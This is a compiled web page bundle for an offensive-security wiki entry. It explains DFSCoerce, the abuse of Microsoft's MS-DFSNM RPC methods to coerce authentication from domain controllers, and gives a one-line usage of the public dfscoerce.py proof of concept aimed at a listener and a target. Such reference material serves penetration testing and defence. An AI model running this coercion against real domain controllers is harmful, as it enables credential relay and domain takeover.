import{_ as t,c as s,a5 as a,o}from"./chunks/framework.B5CpDqM0.js";const m=JSON.parse('{"title":"MS-DFSNM abuse (DFSCoerce)","description":"","frontmatter":{"authors":"ShutdownRepo"},"headers":[],"relativePath":"ad/movement/mitm-and-coerced-authentications/ms-dfsnm.md","filePath":"ad/movement/mitm-and-coerced-authentications/ms-dfsnm.md","lastUpdated":1724982529000}'),i={name:"ad/movement/mitm-and-coerced-authentications/ms-dfsnm.md"};function r(n,e,c,d,h,l){return o(),s("div",null,e[0]||(e[0]=[a('<h1 id="ms-dfsnm-abuse-dfscoerce" tabindex="-1">MS-DFSNM abuse (DFSCoerce) <a class="header-anchor" href="#ms-dfsnm-abuse-dfscoerce" aria-label="Permalink to &quot;MS-DFSNM abuse (DFSCoerce)&quot;">​</a></h1><h2 id="theory" tabindex="-1">Theory <a class="header-anchor" href="#theory" aria-label="Permalink to &quot;Theory&quot;">​</a></h2><p>MS-DFSNM is Microsoft&#39;s Distributed File System Namespace Management protocol. It provides an RPC interface for administering DFS configurations (<a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979" target="_blank" rel="noreferrer">docs.microsoft.com</a>) and is available as an RPC interface. That interface is available through the <code>\\pipe\\netdfs</code> SMB named pipe.</p><p>In mid-2022, <a href="https://twitter.com/filip_dragovic" target="_blank" rel="noreferrer">Filip Dragovic</a> demonstrated the possibility of abusing the protocol to coerce authentications. Similarly to other MS-RPC abuses, this works by using a specific method relying on remote address. In this case (as of July 6th, 2022), the following methods were detected vulnerable: <code>NetrDfsRemoveStdRoot</code> and <code>NetrDfsAddStdRoot</code>. It is worth noting this coercion method only works against domain controllers.</p><h2 id="practice" tabindex="-1">Practice <a class="header-anchor" href="#practice" aria-label="Permalink to &quot;Practice&quot;">​</a></h2><p>The following Python proof-of-concept (<a href="https://github.com/Wh04m1001/DFSCoerce" target="_blank" rel="noreferrer">https://github.com/Wh04m1001/DFSCoerce</a>) implements the <code>NetrDfsRemoveStdRoot</code> and <code>NetrDfsAddStdRoot</code> methods.</p><div class="language-bash vp-adaptive-theme"><button title="Copy Code" class="copy"></button><span class="lang">bash</span><pre class="shiki shiki-themes github-light github-dark vp-code" tabindex="0"><code><span class="line"><span style="--shiki-light:#6F42C1;--shiki-dark:#B392F0;">dfscoerce.py</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -d</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;domain&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -u</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;user&quot;</span><span style="--shiki-light:#005CC5;--shiki-dark:#79B8FF;"> -p</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> &quot;password&quot;</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> LISTENER</span><span style="--shiki-light:#032F62;--shiki-dark:#9ECBFF;"> TARGET</span></span></code></pre></div><h2 id="resources" tabindex="-1">Resources <a class="header-anchor" href="#resources" aria-label="Permalink to &quot;Resources&quot;">​</a></h2><p><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979" target="_blank" rel="noreferrer">https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dfsnm/95a506a8-cae6-4c42-b19d-9c1ed1223979</a></p><p><a href="https://github.com/Wh04m1001/DFSCoerce" target="_blank" rel="noreferrer">https://github.com/Wh04m1001/DFSCoerce</a></p>',10)]))}const f=t(i,[["render",r]]);export{m as __pageData,f as default};